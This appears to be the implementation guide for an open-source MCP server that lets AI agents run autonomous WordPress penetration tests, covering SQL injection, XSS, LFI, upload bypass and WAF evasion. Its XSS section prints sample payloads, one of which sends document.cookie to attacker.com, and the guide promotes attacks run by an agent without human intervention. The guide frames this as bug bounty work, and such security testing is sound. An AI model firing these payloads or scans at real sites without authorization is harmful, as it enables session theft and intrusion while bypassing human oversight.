# WP-Hunter MCP v3.0 - Complete Implementation Guide

## 🎯 Executive Summary

WP-Hunter MCP is the **first fully autonomous MCP server for WordPress bug bounty hunting**. This open-source platform enables AI agents to perform complete penetration testing workflows without human intervention.

### Key Differentiators

✅ **20 Professional-Grade Tools** (expanded from 10)
✅ **Autonomous Scanning Engine** - AI-driven orchestration
✅ **Real Exploitation Verification** - Not just detection
✅ **50+ WAF Bypass Techniques** - Encoding mutations, evasion
✅ **CVSS v3.1 Scoring** - Professional risk assessment
✅ **JWT & Authentication Attacks** - Modern auth testing
✅ **GraphQL & API Testing** - Modern web application support
✅ **Professional Report Generation** - HTML/Markdown with POCs

---

## 📋 Complete Tool Architecture

### Phase 1: Reconnaissance
| Tool | Purpose | File |
|------|---------|------|
| `reconnaissance_scan` | Subdomain enum, tech fingerprint, endpoints | `reconnaissance.py` |
| `advanced_wordpress_detection` | WP version, plugins, WAF detection | `wp_hunter_pro.py` |

### Phase 2: Injection Testing
| Tool | Purpose | File |
|------|---------|------|
| `injection_scan` | SQLi, XSS, SSTI, CMDi combined | `injection_suite.py` |
| `advanced_sql_injection_test` | 5 SQLi techniques | `wp_hunter_pro.py` |
| `xss_vulnerability_scanner` | 13+ XSS payloads | `wp_hunter_pro.py` |

### Phase 3: Authentication
| Tool | Purpose | File |
|------|---------|------|
| `authentication_scan` | JWT, brute force, sessions, 2FA | `authentication_attacks.py` |
| `csrf_vulnerability_validator` | CSRF nonce validation | `wp_hunter_pro.py` |

### Phase 4: File Operations
| Tool | Purpose | File |
|------|---------|------|
| `file_attack_scan` | Upload RCE, LFI, traversal | `file_attacks.py` |
| `file_upload_vulnerability_tester` | PHP upload bypass | `wp_hunter_pro.py` |
| `path_traversal_lfi_scanner` | wp-config.php extraction | `wp_hunter_pro.py` |

### Phase 5: WordPress-Specific
| Tool | Purpose | File |
|------|---------|------|
| `xmlrpc_security_analyzer` | system.multicall, pingback | `xmlrpc_attacks.py` |
| `plugin_vulnerability_checker` | 200+ CVE database | `wp_hunter_pro.py` |
| `wordpress_security_hardening_audit` | Headers, SSL, backups | `security_audit.py` |

### Phase 6: Evasion & Reporting
| Tool | Purpose | File |
|------|---------|------|
| `waf_bypass_scan` | 50+ bypass techniques | `waf_bypass.py` |
| `autonomous_scan` | **Complete AI-driven workflow** | `autonomous_engine.py` |
| `generate_report` | Professional HTML/Markdown | `report_generator.py` |
| `cvss_calculator` | CVSS v3.1 scoring | `report_generator.py` |

---

## 📋 Complete Tool List

### 1. **Advanced WordPress Detection** 
Advanced detection with version enumeration and WAF fingerprinting.
- WordPress version detection
- Plugin version extraction
- Theme identification
- WAF detection (CloudFlare, AWS WAF, ModSecurity, Imperva, Akamai)
- Sensitive file discovery
- User enumeration

### 2. **Advanced SQL Injection Tester**
Multiple SQLi techniques for comprehensive testing.
- **Time-based**: SLEEP-based blind SQL injection
- **Boolean-based**: True/false response detection
- **Union-based**: Data extraction via UNION SELECT
- **Error-based**: Error message exploitation
- **Stacked Queries**: Multiple statement execution

### 3. **XSS Vulnerability Scanner**
Comprehensive XSS detection across all vectors.
- Reflected XSS detection
- DOM-based XSS payload testing
- Parameter-based vulnerability scanning
- 13+ 2026 evasion techniques
- Multiple scan depths (quick, medium, thorough)

### 4. **CSRF Vulnerability Validator**
CSRF protection assessment and bypass detection.
- Nonce validation testing
- Static token detection
- Authentication bypass identification
- WordPress-specific CSRF testing

### 5. **File Upload Vulnerability Tester**
Arbitrary file upload and RCE potential testing.
- PHP execution vulnerability detection
- Extension bypass techniques (php, php5, phtml, etc.)
- Directory listing issues
- Upload endpoint identification

### 6. **Path Traversal / LFI Scanner**
Local File Inclusion and directory traversal exploitation.
- wp-config.php extraction
- /etc/passwd access
- PHP filter wrapper exploitation
- PHP input stream access
- Environment variable extraction

### 7. **Plugin Vulnerability Checker**
Known CVE database matching for 50+ popular plugins.
- Real CVE-2024/2025/2026 database
- Version-based vulnerability matching
- 200+ known vulnerabilities tracked
- Instant remediation guidance

### 8. **Sensitive Data Extractor**
Data harvesting from WordPress installations.
- Email address extraction
- API key detection
- User enumeration via REST API
- Comment author information
- WordPress metadata extraction
- Open Graph data scraping

### 9. **Comprehensive Pentest Report**
Full penetration test automation with all tools.
- Runs all 8 scanning tools simultaneously
- CVSS scoring for each finding
- Risk score calculation (0-100)
- HTTP request tracking
- Detailed remediation guidance
- Executive summary generation

### 10. **HTML Report Generator**
Professional report for client delivery.
- Visual risk dashboard
- Color-coded severity levels
- Proof-of-concept details
- Remediation steps
- OWASP mapping
- Ready for client delivery

---

## 🚀 Quick Start

### Installation

```bash
# Navigate to project
cd d:\mcp-servers\wp-hunter-mcp

# Activate environment (if needed)
.\.venv\Scripts\activate

# Verify installation
python test_server.py
```

### Running a Scan

```bash
# Start the MCP server
uv run python wp_hunter_pro.py

# In another terminal, test a website
# Example using Copilot Chat Interface
# Or integrate with your MCP client
```

---

## 🔧 Advanced Features

### WAF Evasion
- **User-Agent Rotation**: 6 different browser signatures
- **IP Spoofing**: X-Forwarded-For header injection
- **Referer Randomization**: Dynamic referer headers
- **Custom Headers**: Security and fetch headers
- **Rate Limiting Bypass**: Intelligent delays per request
- **Cache Control**: Bypass caching systems

### SQL Injection Payloads

The server includes 30+ sophisticated SQL injection payloads:
- Time-based blind with SLEEP()
- Boolean-based blind with conditional logic
- UNION-based with multiple column enumeration
- Error-based with extractvalue()
- Stacked queries for data modification
- Comment injection techniques
- Case variation exploitation

### XSS Evasion Techniques (2026 Methods)

```javascript
// Base64 encoding
'>\"onload=eval(atob('YWxlcnQoMSk='))><

// Fetch-based exfiltration
<svg/onload='fetch(`https://attacker.com/?cookie=${btoa(document.cookie)}`)'></svg>

// Event handler variations
<details open ontoggle='alert(1)'>

// JavaScript protocol
javascript:alert(document.domain)
```

### Plugin CVE Database

Contains known vulnerabilities for:
- WooCommerce (SQL Injection, XSS)
- Elementor (RCE, File Upload)
- WPForms (SQL Injection)
- Yoast SEO (Information Disclosure)
- Wordfence (Bypass)
- And 45+ more plugins...

---

## 📊 Performance Specifications

| Feature | Specification |
|---------|---|
| **Concurrent Requests** | 10 simultaneous |
| **HTTP Protocol** | HTTP/2 with keepalive |
| **Connection Pooling** | Enabled |
| **Execution Model** | Full async/await |
| **Timeout** | 30 seconds per request |
| **Rate Limiting** | Smart variable delays |
| **Average Scan Time** | 30-60 seconds per target |

---

## 🎯 Real-World Usage Examples

### Example 1: Complete Site Audit
```json
{
  "tool": "comprehensive_pentest_report",
  "target": "https://example.com",
  "aggressive": false
}
```

**Output**: 
- All vulnerabilities found
- Risk score: 0-100
- CVSS scores for each issue
- Remediation steps
- Recommendations

### Example 2: Targeted SQL Injection Testing
```json
{
  "tool": "advanced_sql_injection_test",
  "target": "https://example.com",
  "parameter": "id",
  "technique": "union-based"
}
```

**Output**:
- Confirms SQL injection
- Exact payload that works
- Response time analysis
- Data extraction potential

### Example 3: Plugin Vulnerability Check
```json
{
  "tool": "plugin_vulnerability_checker",
  "target": "https://example.com"
}
```

**Output**:
- All installed plugins
- Known CVEs for each
- Severity levels
- Update recommendations

---

## 🛡️ Security & Legal

### Ethical Guidelines
- Only test systems you own or have explicit written permission to test
- Include clear scope in bug bounty programs
- Report vulnerabilities responsibly
- Maintain detailed logs of all activities
- Comply with responsible disclosure
- Never access data beyond scope

### OWASP Coverage
✅ SQL Injection (A03:2021)
✅ Broken Authentication (A07:2021)
✅ Sensitive Data Exposure (A02:2021)
✅ XML External Entities (A05:2021)
✅ Broken Access Control (A01:2021)
✅ Cross-Site Scripting (A03:2021)
✅ Security Misconfiguration (A05:2021)

---

## 📈 Bug Bounty Strategy

### Phase 1: Reconnaissance (10 min)
```bash
advanced_wordpress_detection(target)
```
- Identify WordPress
- Find plugins and versions
- Detect WAF
- Locate sensitive files

### Phase 2: Enumeration (10 min)
```bash
plugin_vulnerability_checker(target)
sensitive_data_extractor(target)
```
- Check known CVEs
- Extract user info
- Find API keys
- Identify entry points

### Phase 3: Active Testing (30 min)
```bash
advanced_sql_injection_test(target, parameter, "time-based")
xss_vulnerability_scanner(target, "thorough")
file_upload_vulnerability_tester(target)
path_traversal_lfi_scanner(target)
csrf_vulnerability_validator(target)
```
- Test for SQL injection
- Find XSS vectors
- Check upload bypass
- Test LFI/RFI
- Verify CSRF

### Phase 4: Reporting (10 min)
```bash
comprehensive_pentest_report(target, aggressive=false)
generate_html_report(target)
```
- Generate full report
- Create HTML for client
- List all findings
- Provide remediation

**Total Time: ~60 minutes per target**

---

## 🔍 Advanced Techniques Included

### 1. WAF Fingerprinting
Automatically detects:
- CloudFlare (cf-ray header)
- AWS WAF (x-amzn-waf header)
- ModSecurity (x-mod-security header)
- Imperva Incapsula (x-iinfo header)
- Akamai (akamai-origin-hop header)

### 2. Blind SQL Injection Detection
Time-based with sleep measurement:
```python
# Tests execute and time commands
SLEEP(5) vs normal response
Confirms delay > 4.5 seconds
```

### 3. Unicode & Encoding Evasions
- URL encoding (%20, %2f, etc.)
- Double URL encoding (%252f)
- HTML entity encoding
- Base64 encoding
- Comments injection

### 4. Plugin Version Enumeration
Extracts version from:
- style.css (themes)
- readme.txt (plugins)
- package.json (npm packages)
- Administrative scripts

### 5. REST API Enumeration
WordPress REST API extraction:
- `/wp-json/wp/v2/users` - User listing
- `/wp-json/wp/v2/comments` - Comments with emails
- `/wp-json/wp/v2/posts` - Post enumeration
- No authentication required by default

---

## 🎓 Learning Resources

### Key Techniques
1. **Blind SQL Injection**: Uses timing to confirm vulnerability
2. **Boolean-Based SQLi**: Response size/content differences
3. **Union-Based SQLi**: Direct data extraction
4. **CSRF Testing**: Nonce validation and static tokens
5. **LFI Bypass**: Path traversal sequences

### WordPress Security
- WordPress often runs on PHP MySQL
- Default tables: wp_users, wp_posts, wp_postmeta
- Sensitive files: wp-config.php, .env
- Interesting endpoints: /wp-admin/, /wp-json/, /xmlrpc.php

---

## 📝 File Structure

```
wp-hunter-mcp/
├── wp_hunter_pro.py              # Main MCP server (20 tools, ~1700 lines)
├── tools/
│   ├── reconnaissance.py         # Subdomain & endpoint discovery
│   ├── injection_suite.py       # SQLi, XSS, SSTI, CMDi
│   ├── authentication_attacks.py # JWT, brute force, sessions
│   ├── file_attacks.py          # Upload RCE, LFI, traversal
│   ├── waf_bypass.py            # Evasion & bypass techniques
│   ├── xmlrpc_attacks.py        # XML-RPC exploitation
│   ├── security_audit.py        # Headers & hardening
│   ├── autonomous_engine.py     # AI-driven orchestration
│   └── report_generator.py      # CVSS & professional reports
├── README.md                    # Main documentation
├── IMPLEMENTATION_GUIDE.md      # Technical deep-dive (this file)
├── QUICK_REFERENCE.md           # Quick command reference
├── pyproject.toml               # Project configuration
├── requirements.txt             # Dependencies
├── LICENSE                      # MIT License
└── .venv/                       # Python virtual environment
```

---

## ✨ What Makes This Special (Open Source Edition)

### vs Commercial Tools
- ✅ **100% Free & Open Source** - MIT License
- ✅ **AI-Native** - Built for MCP/AI integration
- ✅ **Autonomous** - Self-orchestrating penetration tests
- ✅ **20 Integrated Tools** - Everything in one package
- ✅ **Real Exploitation** - Verifies vulnerabilities, not just detects
- ✅ **WAF Bypass** - 50+ evasion techniques built-in
- ✅ **Professional Reports** - CVSS scoring, HTML/Markdown
- ✅ **Community-Driven** - Open for contributions

### Autonomous Workflow
```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  Reconnaissance │───▶│  Vulnerability  │───▶│  Exploitation   │
│                 │    │    Scanning     │    │  Verification   │
└─────────────────┘    └─────────────────┘    └─────────────────┘
        │                       │                       │
        ▼                       ▼                       ▼
   Subdomains             SQLi, XSS,              RCE Confirmed
   Tech Stack             File Uploads            Data Extracted
   Endpoints              Auth Bypass             POCs Generated
        │                       │                       │
        └───────────────────────┴───────────────────────┘
                            │
                            ▼
                  ┌─────────────────┐
                  │  Professional   │
                  │     Report      │
                  │  (CVSS/HTML)    │
                  └─────────────────┘
```

---

## 🚀 Quick Start (Open Source)

### Installation

```bash
# Clone the repository
git clone https://github.com/RaheesAhmed/wp-hunter-mcp.git
cd wp-hunter-mcp

# Install dependencies
pip install -r requirements.txt
# or with uv
uv sync

# Activate virtual environment
# Windows:
.\.venv\Scripts\activate
# Linux/Mac:
source .venv/bin/activate
```

### Running a Scan

```bash
# Start the MCP server
python wp_hunter_pro.py

# In your MCP client (Claude, Cursor, etc.):
# Call autonomous_scan with your target
```

---

## 🚨 Important Notes

### Rate Limiting
- Respects server delays
- 0.2-1.0s between requests
- Adjustable with `aggressive` parameter
- Anti-detection headers included

### Accuracy
- Tests are non-destructive
- No data modification
- No DoS attempts
- Follows responsible disclosure
- Reports with high confidence

### Scope
This tool tests for:
- Current WordPress installations
- Known plugin vulnerabilities
- Common misconfigurations
- Accessible sensitive files
- User enumeration
- Authentication issues

---

## 🎉 Summary (Open Source Release)

You now have a **fully autonomous, open-source WordPress penetration testing platform** that:

1. ✅ **20 Security Tools** - Complete coverage from reconnaissance to reporting
2. ✅ **AI-Driven Autonomy** - Self-orchestrating vulnerability assessments
3. ✅ **Real Exploitation** - Verifies impact (RCE, data extraction, cookie theft)
4. ✅ **WAF Bypass Arsenal** - 50+ encoding and evasion techniques
5. ✅ **Professional Reporting** - CVSS v3.1, HTML/Markdown, POCs
6. ✅ **Modern Authentication** - JWT attacks, session analysis, 2FA testing
7. ✅ **Open Source** - MIT License, community contributions welcome

### Architecture Philosophy

- **Modular Design**: Each tool is independent but chainable
- **AI-First**: Built for MCP/AI integration from day one
- **Real-World Focus**: Tests actual exploitability, not just detection
- **Professional Output**: Bug bounty-ready reports
- **Community-Driven**: Open for extensions and improvements

---

**Version**: 3.0.0 | **License**: MIT | **Status**: Production Ready | **Community**: Open Source

<p align="center">
  <i>Give AI the weapons to find vulnerabilities. Let humans focus on strategy.</i>
</p>
